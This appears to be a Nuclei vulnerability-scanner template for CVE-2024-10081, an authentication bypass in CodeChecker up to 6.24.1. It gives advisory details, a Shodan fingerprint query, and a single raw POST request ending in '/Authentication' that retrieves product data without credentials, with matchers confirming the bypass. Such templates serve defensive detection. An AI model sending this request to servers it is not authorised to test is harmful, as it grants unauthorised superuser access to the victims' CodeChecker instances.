id: CVE-2024-10081

info:
  name: CodeChecker <= 6.24.1 - Authentication Bypass
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    Authentication bypass occurs when the API URL ends with Authentication, Configuration or ServerInfo. This bypass allows superuser access to all API endpoints other than Authentication. These endpoints include the ability to add, edit, and remove products, among others.
  impact: |
    Unauthenticated attackers can bypass authentication by crafting API URLs ending with specific keywords, gaining superuser access to all API endpoints including product management and configuration.
  remediation: |
    Upgrade CodeChecker to version 6.24.2 or later.
  reference:
    - https://github.com/advisories/GHSA-f3f8-vx3w-hp5q
    - https://github.com/Ericsson/codechecker/security/advisories/GHSA-f3f8-vx3w-hp5q
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10081
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 10
    cve-id: CVE-2024-10081
    cwe-id: CWE-288
    epss-score: 0.65481
    epss-percentile: 0.98438
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-1496590341
  tags: cve,cve2024,code-checker,auth-bypass,vkev,vuln

http:
  - raw:
      - |
        POST /v6.58/Products/Authentication HTTP/1.1
        Host: {{Hostname}}

        [1,"getProducts",1,1,{}]

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"{\"0\":{\"lst\":[\"rec\",")'
          - "!contains(body,'Error code 401: Unauthorized')"
          - "contains(header,'application/x-thrift')"
        condition: and
# digest: 4a0a00473045022100d46edfc5be8211c9fa960849f2dd2a182a156093d6b16d9e627496035b05bb690220146d9663fd3338959000331b6fd43a879138235c2691a38a8dd6189a3cf0974d:922c64590222798bb761d5b6d8e72950